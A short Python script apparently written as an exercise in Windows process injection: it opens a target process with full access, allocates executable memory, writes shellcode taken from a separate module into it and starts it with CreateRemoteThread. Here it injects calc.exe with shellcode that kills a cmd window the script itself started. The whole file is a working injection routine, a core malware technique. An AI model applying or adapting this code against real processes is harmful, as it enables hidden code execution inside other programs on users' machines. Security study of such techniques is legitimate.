from ctypes import *
import subprocess
import time
from shellcodes import shellcode

PAGE_EXECUTE_READWRITE = 0x00000040
PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0xFFF)
VIRTUAL_MEM = (0x1000 | 0x2000)

kernel32 = windll.kernel32
our_pid = kernel32.GetCurrentProcessId()

def inject(pid, inject_code, pid_to_kill):

    # pid_ascii_str = [f"\\x{ord(k):02x}" for k in str(pid_to_kill)]
    ind = inject_code.find(4*"\x41")
    icode = inject_code[:ind] + str(pid_to_kill) + "\x00"
    code_size = len(icode)

    # Get a handle to the process we are injecting into.
    h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    if not h_process:
        print(f"[*] Couldn't acquire a handle to PID: {pid}")
        exit()

    # Allocate some space for the shellcode
    arg_address = kernel32.VirtualAllocEx(
        h_process, 0, code_size, VIRTUAL_MEM, PAGE_EXECUTE_READWRITE)
    print(f"[*] Allocated shellcode address: 0x{arg_address:08x}")

    # Write out the shellcode
    written = c_int(0)
    icode_byte = icode.encode('latin-1')
    kernel32.WriteProcessMemory(
        h_process, arg_address, icode_byte, code_size, byref(written))

    # Now we create the remote thread and point it's entry routine
    # to be head of our shellcode
    thread_id = c_ulong(0)
    if not kernel32.CreateRemoteThread(h_process, None, 0, arg_address, None, 0, byref(thread_id)):
        print("[*] Failed to inject process-killing shellcode. Exiting.")
        exit()

    print(
        f"[*] Remote thread successfully created. TID = {thread_id.value}(0x{thread_id.value:x})")

# =================================


args = 'cmd /k echo I am about to be terminated!'
Popen_to_kill = subprocess.Popen(
    args, creationflags=subprocess.CREATE_NEW_CONSOLE)
pid_to_kill = Popen_to_kill.pid
print(f"if Popen_to_kill.poll() = {Popen_to_kill.poll()} == None")
print(
    f"    [victim process] to be killed has been created. PID = {pid_to_kill}")


args = 'cmd /k pause'
args = 'cmd /k echo victim process should been killed by me!!'
args = 'C:\Windows\SysWOW64\calc.exe'
# args = 'cmd /k echo victim process && echo has been killed by me!!'
Popen_for_inject = subprocess.Popen(
    args, creationflags=subprocess.CREATE_NEW_CONSOLE)
pid_for_inject = Popen_for_inject.pid
print(f"if Popen_for_inject.poll() = {Popen_for_inject.poll()} == None")
print(
    f"    [injected process] to inject has been created. PID = {pid_for_inject}")

# ---------------------------------
print("\n")
input("press any key to inject ...")
inject(pid_for_inject, shellcode, pid_to_kill)
print("Injection done!")
print(f"Process (pid={pid_to_kill}) should not be running anymore!")
time.sleep(1)
print("\n")
# ---------------------------------


print(f"if Popen_to_kill.poll() = {Popen_to_kill.poll()} != None")
print(f"    [victim process] has been killed. PID = {pid_to_kill}")
